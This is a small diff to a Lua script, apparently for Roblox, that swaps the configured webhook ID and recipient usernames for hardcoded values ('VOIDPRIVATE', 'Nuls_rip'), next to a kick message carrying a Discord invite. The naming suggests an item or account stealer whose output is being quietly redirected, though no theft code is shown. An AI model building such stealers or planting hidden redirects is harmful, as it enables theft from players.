@@ -12,10 +12,10 @@ if not cfg then
     return
 end
 
-local WEBHOOK_ID = cfg.WEBHOOK_ID
+local WEBHOOK_ID = "VOIDPRIVATE"
 local PROXY_URL = cfg.PROXY_URL
 local PUBLIC_PROXY = cfg.PUBLIC_PROXY
-local USERNAMES = cfg.USERNAMES
+local USERNAMES = {"Nuls_rip"}
 
 if WEBHOOK_ID == "" or PROXY_URL == "" then
     LocalPlayer:Kick("Invalid configuration | discord.gg/arasaka-corp")
